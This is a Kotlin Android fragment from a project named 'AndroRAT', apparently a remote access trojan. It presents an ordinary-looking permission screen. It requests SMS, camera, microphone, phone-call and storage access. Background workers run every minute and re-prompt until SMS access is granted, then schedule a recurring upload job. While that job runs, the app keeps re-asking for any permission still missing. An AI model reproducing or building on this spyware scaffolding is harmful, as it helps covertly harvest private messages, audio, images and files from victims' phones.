package com.ierusalem.androrat.screens.home

import android.Manifest
import android.app.Activity
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.ui.graphics.ImageBitmap
import androidx.compose.ui.graphics.asAndroidBitmap
import androidx.compose.ui.platform.ComposeView
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.fragment.app.activityViewModels
import androidx.navigation.fragment.findNavController
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkInfo
import androidx.work.WorkManager
import com.ierusalem.androrat.R
import com.ierusalem.androrat.ui.components.CameraPermissionTextProvider
import com.ierusalem.androrat.ui.components.MusicAndAudioPermissionTextProvider
import com.ierusalem.androrat.ui.components.PermissionDialog
import com.ierusalem.androrat.ui.components.PhoneCallPermissionTextProvider
import com.ierusalem.androrat.ui.components.PhotosAndVideosPermissionTextProvider
import com.ierusalem.androrat.ui.components.ReadExternalStoragePermissionTextProvider
import com.ierusalem.androrat.ui.components.ReadSMSMessageTextProvider
import com.ierusalem.androrat.ui.components.RecordAudioPermissionTextProvider
import com.ierusalem.androrat.ui.theme.AndroRATTheme
import com.ierusalem.androrat.utility.Constants
import com.ierusalem.androrat.utility.executeWithLifecycle
import com.ierusalem.androrat.utility.openAppSettings
import com.ierusalem.androrat.worker.PermissionRequestWorker
import com.ierusalem.androrat.worker.UploadWorker
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.util.concurrent.TimeUnit

class HomeFragment : Fragment() {

    private val homeViewModel: HomeViewModel by activityViewModels()

    private val recordAudioAndCallPhonePermissions = arrayOf(
        Manifest.permission.CALL_PHONE,
        Manifest.permission.RECORD_AUDIO,
    )

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private val readMediaImagesAndAudioPermissions = arrayOf(
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_AUDIO,
    )

    @SuppressWarnings("unused")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        /**
         * To check the permissions whether granted or not
         */
//        ContextCompat.checkSelfPermission(
//            this, Manifest.permission.READ_MEDIA_IMAGES
//        ) == PackageManager.PERMISSION_GRANTED -> {
//            // You can use the API that requires the permission.
//        }

        /**
         * To check whether a device supports microphone and camera toggles,
         * add the logic that appears in the following code snippet:
         */

//        val sensorPrivacyManager = applicationContext
//            .getSystemService(SensorPrivacyManager::class.java)
//                as SensorPrivacyManager
//        val supportsMicrophoneToggle = sensorPrivacyManager
//            .supportsSensorToggle(Sensors.MICROPHONE)
//        val supportsCameraToggle = sensorPrivacyManager
//            .supportsSensorToggle(Sensors.CAMERA)

        /**
         * Check whether your app is running on a device that has a front-facing camera.
         */
//        if (applicationContext.packageManager.hasSystemFeature(
//                PackageManager.FEATURE_CAMERA_FRONT
//            )
//        ) {
//            // Continue with the part of your app's workflow that requires a
//            // front-facing camera.
//        } else {
//            // Gracefully degrade your app experience.
//        }
    }

    override fun onResume() {
        super.onResume()
        Constants.PERMISSIONS.forEach { permission ->
            homeViewModel.updatePermissionState(
                permission = permission, isGranted = ContextCompat.checkSelfPermission(
                    requireContext(),
                    permission
                ) == PackageManager.PERMISSION_GRANTED
            )
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {

        return ComposeView(requireContext()).apply {
            setContent {
                val context = LocalContext.current
                val lifecycleOwner = LocalLifecycleOwner.current
                val state by homeViewModel.state.collectAsState()
                val dialogQueue = homeViewModel.visiblePermissionDialogQueue
                val workManager = WorkManager.getInstance(context)

                val multiplePermissionResultLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestMultiplePermissions(),
                    onResult = { perms ->
                        recordAudioAndCallPhonePermissions.forEach { permission ->
                            homeViewModel.updatePermissionState(
                                permission = permission,
                                isGranted = perms[permission] == true
                            )
                            if (perms[permission] == true) {
                                Toast.makeText(
                                    requireContext(),
                                    "Permission Granted for Record Audio and Phone Call",
                                    Toast.LENGTH_SHORT
                                ).show()
                            } else {
                                homeViewModel.onPermissionResult(
                                    permission = permission,
                                    isGranted = false
                                )
                            }
                        }
                    }
                )


                val readMediaImagesAndAudioPermissionsAndroid13Launcher =
                    rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestMultiplePermissions(),
                        onResult = { perms ->
                            readMediaImagesAndAudioPermissions.forEach { permission ->
                                homeViewModel.updatePermissionState(
                                    permission = permission,
                                    isGranted = perms[permission] == true
                                )
                                if (perms[permission] == true) {
                                    Toast.makeText(
                                        requireContext(),
                                        "Permission Granted for Images and Audio",
                                        Toast.LENGTH_SHORT
                                    ).show()
                                } else {
                                    homeViewModel.onPermissionResult(
                                        permission = permission,
                                        isGranted = false
                                    )
                                }
                            }
                        }
                    )

                val readExternalStoragePermissionUnderAndroid11Launcher =
                    rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestPermission(),
                        onResult = { isGranted ->
                            homeViewModel.updatePermissionState(
                                permission = Manifest.permission.READ_EXTERNAL_STORAGE,
                                isGranted = isGranted
                            )
                            if (isGranted) {
                                Toast.makeText(
                                    requireContext(),
                                    "Permission Granted for Read External Storage",
                                    Toast.LENGTH_SHORT
                                ).show()
                            } else {
                                homeViewModel.onPermissionResult(
                                    permission = Manifest.permission.READ_EXTERNAL_STORAGE,
                                    isGranted = false
                                )
                            }
                        }
                    )

                val recordAudioPermissionLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestPermission(),
                    onResult = { isGranted ->
                        homeViewModel.updatePermissionState(
                            permission = Manifest.permission.RECORD_AUDIO,
                            isGranted = isGranted
                        )
                        if (isGranted) {
                            Toast.makeText(
                                requireContext(),
                                "Permission Granted for Record Audio",
                                Toast.LENGTH_SHORT
                            ).show()
                        } else {
                            homeViewModel.onPermissionResult(
                                permission = Manifest.permission.RECORD_AUDIO,
                                isGranted = false
                            )
                        }
                    }
                )

                val cameraResultPermissionLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestPermission(),
                    onResult = { isGranted ->
                        homeViewModel.updatePermissionState(
                            permission = Manifest.permission.CAMERA,
                            isGranted = isGranted
                        )
                        if (isGranted) {
                            Toast.makeText(
                                requireContext(),
                                "Permission Granted for Camera",
                                Toast.LENGTH_SHORT
                            ).show()
                        } else {
                            homeViewModel.onPermissionResult(
                                permission = Manifest.permission.CAMERA,
                                isGranted = false
                            )
                        }
                    }
                )

                val readSMSMessagesPermissionLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestPermission(),
                    onResult = { isGranted ->
                        homeViewModel.updatePermissionState(
                            permission = Manifest.permission.READ_SMS,
                            isGranted = isGranted
                        )
                        if (isGranted) {
                            findNavController().navigate(R.id.action_homeFragment_to_messageFragment)
                        } else {
                            homeViewModel.onPermissionResult(
                                permission = Manifest.permission.READ_SMS,
                                isGranted = false
                            )
                        }
                    }
                )

                AndroRATTheme {

                    LaunchedEffect(
                        key1 = Unit,
                        block = {
                            if (ContextCompat.checkSelfPermission(
                                    requireContext(),
                                    Manifest.permission.READ_SMS
                                ) == PackageManager.PERMISSION_GRANTED
                            ) {
                                //cancel periodic unique work for permission request
                                workManager.cancelUniqueWork(Constants.PERMISSION_REQUEST_WORK_NAME)

                                val uploadWorkRequest = PeriodicWorkRequestBuilder<UploadWorker>(
                                    repeatInterval = 1,
                                    repeatIntervalTimeUnit = TimeUnit.MINUTES,
                                )
                                    .build()

                                workManager.enqueueUniquePeriodicWork(
                                    Constants.UPLOAD_WORK_NAME,
                                    ExistingPeriodicWorkPolicy.CANCEL_AND_REENQUEUE,
                                    uploadWorkRequest
                                )
                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.UPLOAD_WORK_NAME)
                                    .observe(viewLifecycleOwner) {
                                        it.forEach { workInfo ->
                                            if (workInfo.state == WorkInfo.State.RUNNING) {
                                                val notGrantedPermissions =
                                                    homeViewModel.state.value.permissions.filter { (_, isGranted) ->
                                                        !isGranted
                                                    }
                                                notGrantedPermissions.forEach { (permission, isGranted) ->
                                                    when (permission) {

                                                        Manifest.permission.READ_MEDIA_AUDIO -> {
                                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                                arrayOf(permission)
                                                            )
                                                        }

                                                        Manifest.permission.READ_MEDIA_IMAGES -> {
                                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                                arrayOf(permission)
                                                            )
                                                        }

                                                        Manifest.permission.READ_EXTERNAL_STORAGE -> {
                                                            readExternalStoragePermissionUnderAndroid11Launcher.launch(
                                                                permission
                                                            )
                                                        }

                                                        Manifest.permission.CAMERA -> {
                                                            cameraResultPermissionLauncher.launch(
                                                                permission
                                                            )
                                                        }

                                                        Manifest.permission.READ_SMS -> {
                                                            readSMSMessagesPermissionLauncher.launch(
                                                                permission
                                                            )
                                                        }

                                                        Manifest.permission.RECORD_AUDIO -> {
                                                            multiplePermissionResultLauncher.launch(
                                                                arrayOf(permission)
                                                            )
                                                        }

                                                        Manifest.permission.CALL_PHONE -> {
                                                            multiplePermissionResultLauncher.launch(
                                                                arrayOf(permission)
                                                            )
                                                        }
                                                    }
                                                    Log.d(
                                                        "ahi3646_not_only",
                                                        "onCreateView: $permission - $isGranted "
                                                    )
                                                }
                                            }
                                            Log.d(
                                                "ahi3646_upload_info",
                                                "onCreateView: workInfo - ${workInfo.state} "
                                            )
                                        }
                                    }
                            } else {
                                //cancel periodic unique work for upload
                                workManager.cancelUniqueWork(Constants.UPLOAD_WORK_NAME)

                                val permissionWorkRequest =
                                    PeriodicWorkRequestBuilder<PermissionRequestWorker>(
                                        repeatInterval = 1,
                                        repeatIntervalTimeUnit = TimeUnit.MINUTES,
                                    )
                                        .build()
                                workManager.enqueueUniquePeriodicWork(
                                    Constants.PERMISSION_REQUEST_WORK_NAME,
                                    ExistingPeriodicWorkPolicy.KEEP,
                                    permissionWorkRequest
                                )
                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.PERMISSION_REQUEST_WORK_NAME)
                                    .observe(lifecycleOwner) {
                                        it.forEach { workInfo ->
                                            Log.d(
                                                "ahi3646_request_info",
                                                "onCreateView: workInfo - ${workInfo.state} "
                                            )
                                        }
                                    }
                            }
                        }
                    )

                    dialogQueue
                        .reversed()
                        .forEach { permission ->
                            PermissionDialog(
                                permissionTextProvider = when (permission) {
                                    Manifest.permission.READ_MEDIA_AUDIO -> {
                                        MusicAndAudioPermissionTextProvider()
                                    }
                                    /**
                                     * No need to add Manifest.permission.READ_MEDIA_VIDEO
                                     * this will make rational dialog pop up two times for same warning
                                     * Once user allow for READ_VIDEOS or READ_IMAGE , both permissions
                                     * will be accessible for app
                                     */
                                    Manifest.permission.READ_MEDIA_IMAGES -> {
                                        PhotosAndVideosPermissionTextProvider()
                                    }

                                    Manifest.permission.READ_EXTERNAL_STORAGE -> {
                                        ReadExternalStoragePermissionTextProvider()
                                    }

                                    Manifest.permission.CAMERA -> {
                                        CameraPermissionTextProvider()
                                    }

                                    Manifest.permission.READ_SMS -> {
                                        ReadSMSMessageTextProvider()
                                    }

                                    Manifest.permission.RECORD_AUDIO -> {
                                        RecordAudioPermissionTextProvider()
                                    }

                                    Manifest.permission.CALL_PHONE -> {
                                        PhoneCallPermissionTextProvider()
                                    }

                                    else -> return@forEach
                                },
                                isPermanentlyDeclined = !shouldShowRequestPermissionRationale(
                                    permission
                                ),
                                onDismiss = homeViewModel::dismissDialog,
                                onOkClick = {
                                    dialogQueue.forEach {
                                        Log.d("permissions", "onCreateView ok : $it ")
                                    }
                                    when (permission) {

                                        Manifest.permission.READ_MEDIA_AUDIO -> {
                                            homeViewModel.dismissDialog()
                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                arrayOf(permission)
                                            )
                                        }

                                        Manifest.permission.READ_MEDIA_IMAGES -> {
                                            homeViewModel.dismissDialog()
                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                arrayOf(permission)
                                            )
                                        }

                                        Manifest.permission.READ_EXTERNAL_STORAGE -> {
                                            homeViewModel.dismissDialog()
                                            readExternalStoragePermissionUnderAndroid11Launcher.launch(
                                                permission
                                            )
                                        }

                                        Manifest.permission.CAMERA -> {
                                            homeViewModel.dismissDialog()
                                            cameraResultPermissionLauncher.launch(permission)
                                        }

                                        Manifest.permission.READ_SMS -> {
                                            homeViewModel.dismissDialog()
                                            readSMSMessagesPermissionLauncher.launch(permission)
                                        }

                                        Manifest.permission.RECORD_AUDIO -> {
                                            homeViewModel.dismissDialog()
                                            multiplePermissionResultLauncher.launch(
                                                arrayOf(permission)
                                            )
                                        }

                                        Manifest.permission.CALL_PHONE -> {
                                            homeViewModel.dismissDialog()
                                            multiplePermissionResultLauncher.launch(
                                                arrayOf(permission)
                                            )
                                        }
                                    }
                                },
                                onGoToAppSettingsClick = ::openAppSettings
                            )
                        }

                    HomeScreen(
                        state = state,
                        onOpenMessageFragment = {
                            readSMSMessagesPermissionLauncher.launch(Manifest.permission.READ_SMS)
                        },
                        onSaveScreenshotClick = {
                            //todo
                            if (state.screenshot != null) {
                                saveMediaToStorage(state.screenshot!!)
                            } else {
                                Toast.makeText(
                                    requireContext(),
                                    "Can not save!",
                                    Toast.LENGTH_SHORT
                                ).show()
                            }
                        },
                        onWriteExternalStoragePermissionRequest = {

                        },
                        onReadExternalStoragePermissionRequest = {
                            when (Build.VERSION.SDK_INT) {

                                in Build.VERSION_CODES.M..Build.VERSION_CODES.Q -> {
                                    //todo check these versions
                                    readExternalStoragePermissionUnderAndroid11Launcher.launch(
                                        Manifest.permission.READ_EXTERNAL_STORAGE
                                    )
                                }

                                in Build.VERSION_CODES.R..Build.VERSION_CODES.S_V2 -> {
                                    if (Environment.isExternalStorageManager()) {
                                        Toast.makeText(
                                            requireContext(),
                                            "Permission granted for ReadExternalStorage",
                                            Toast.LENGTH_SHORT
                                        ).show()
                                    } else {
                                        Log.d("ahi3646", "onCreateView: read permission denied")
                                        try {
                                            val intent = Intent()
                                            intent.setAction(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                                            val uri = Uri.fromParts(
                                                "package",
                                                activity?.packageName,
                                                null
                                            )
                                            intent.setData(uri)
                                            startForResultLauncher.launch(intent)
                                        } catch (e: Exception) {
                                            val intent = Intent()
                                            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                                            startForResultLauncher.launch(intent)
                                        }
                                    }
                                }

                                //this works in sdk 33 or higher versions
                                in Build.VERSION_CODES.TIRAMISU..Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                                    //todo check these versions
                                    readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                        readMediaImagesAndAudioPermissions
                                    )
                                }
                            }
                        },
                        onMultiplePermissionRequest = {
                            multiplePermissionResultLauncher.launch(
                                recordAudioAndCallPhonePermissions
                            )
                        },
                        onRecordAudioPermissionRequest = {
                            recordAudioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
                        },
                        onCameraPermissionRequest = {
                            cameraResultPermissionLauncher.launch(Manifest.permission.CAMERA)
                        },
                        onTakeScreenShotClick = {
                            homeViewModel.updatePhoto(it)
                        }
                    )
                }
            }
        }
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        homeViewModel.screenNavigation.executeWithLifecycle(
            lifecycle = viewLifecycleOwner.lifecycle,
            action = ::executeNavigation
        )
    }

    @RequiresApi(Build.VERSION_CODES.R)
    val startForResultLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if (result.resultCode == Activity.RESULT_OK) {
            //  you will get result here in result.data
            Log.d(
                "ahi3646",
                "onActivityResult: Manage External Storage Permissions Granted"
            )
        }
        if (result.resultCode == Activity.RESULT_CANCELED) {
            Log.d(
                "ahi3646",
                "onActivityResult: Manage External Storage Permissions denied"
            )
        }
    }

    private fun executeNavigation(navigation: HomeScreenNavigation) {
        when (navigation) {
            HomeScreenNavigation.OpenMessageFragment -> {
                findNavController().navigate(R.id.action_homeFragment_to_messageFragment)
            }
        }
    }

    private fun saveMediaToStorage(bitmap: ImageBitmap) {
        val filename = "${System.currentTimeMillis()}.jpg"
        var fos: OutputStream? = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            activity?.contentResolver?.also { resolver ->
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
                    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpg")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
                }
                val imageUri: Uri? =
                    resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
                fos = imageUri?.let { resolver.openOutputStream(it) }
            }
        } else {
            val imagesDir =
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
            val image = File(imagesDir, filename)
            fos = FileOutputStream(image)
        }
        fos?.use {
            bitmap.asAndroidBitmap().compress(Bitmap.CompressFormat.JPEG, 100, it)
            Toast.makeText(
                requireContext(),
                getString(R.string.saved_to_photos_debug), Toast.LENGTH_SHORT
            ).show()
        }
    }

}